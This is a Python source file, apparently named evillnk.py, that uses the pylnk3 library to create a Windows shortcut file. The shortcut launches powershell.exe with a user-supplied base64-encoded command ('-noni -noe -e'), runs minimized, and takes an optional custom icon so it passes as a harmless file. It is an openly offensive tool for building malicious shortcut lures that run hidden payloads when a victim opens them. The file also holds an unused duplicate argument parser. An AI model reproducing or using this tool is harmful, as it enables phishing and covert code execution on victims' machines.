#!/usr/bin/env python3

import sys
import pylnk3
import argparse
from datetime import datetime


def create_lnk(name, target, args, icon, icon_index):
    target_split = target.split('\\')
    target_file = target_split[-1]
    target_drive = target_split[0]
    target_directory = '\\'.join(target_split[0:-1]) + '\\'

    lnk = pylnk3.create(name)

    insert_info(lnk, target, target_directory, args, icon, icon_index)

    levels = list(pylnk3.path_levels(target))
    elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER), pylnk3.DriveEntry(target_drive)]

    for level in target_split[1:-1]:
        entry = build_entry(level, is_dir=True)
        elements.append(entry)

    entry = build_entry(target_file, is_dir=False)
    elements.append(entry)

    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements

    write_lnk(lnk)


def insert_info(lnk, target_full, target_directory, args, icon, icon_index=0):
    lnk.specify_local_location(target_full)

    lnk._link_info.size_local_volume_table = 0
    lnk._link_info.volume_label = ""
    lnk._link_info.drive_serial = 0
    lnk._link_info.local = True
    lnk.window_mode = 'Minimized'

    if args is not None:
        lnk.arguments = args
    if icon is not None:
        lnk.icon = icon
        lnk.icon_index = icon_index

    lnk._link_info.local_base_path = target_full

    lnk.working_dir = target_directory


def build_entry(name, is_dir):
    entry = pylnk3.PathSegmentEntry()
    entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
    entry.file_size = 0

    n = datetime.now()
    entry.modified = n
    entry.created = n
    entry.accessed = n

    entry.short_name = name
    entry.full_name = entry.short_name

    return entry


def write_lnk(lnk):
    with open(lnk.file, 'wb') as f:
        lnk.write(f)


def parse_arguments():
    parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes PowerShell with arguments')
    parser.add_argument('lnk_name', action='store', help='Name of the shortcut file')
    parser.add_argument('-a', '--args', action='store', dest='arguments', help='Arguments to pass to PowerShell. E.g. "-noe -noni -e <encoded command>')
    parser.add_argument('-i', '--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
    parser.add_argument('-n', '--ii', '--icon_index', action='store', dest='icon_index', help='Index within icon file')
    args = parser.parse_args()
    return args

def main():
    parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes a PowerShell encoded command')
    parser.add_argument('lnk_name', action='store', help='Name of the shortcut file')
    parser.add_argument('command', action='store', help='Encoded command to execute with PowerShell')
    parser.add_argument('-i', '--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
    parser.add_argument('-n', '--ii', '--icon_index', type=int, action='store', dest='icon_index', help='Index within icon file')
    args = parser.parse_args()
    target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
    arguments = '-noni -noe -e ' + args.command
    create_lnk(args.lnk_name, target, arguments, args.icon, args.icon_index)


if __name__ == '__main__':
    main()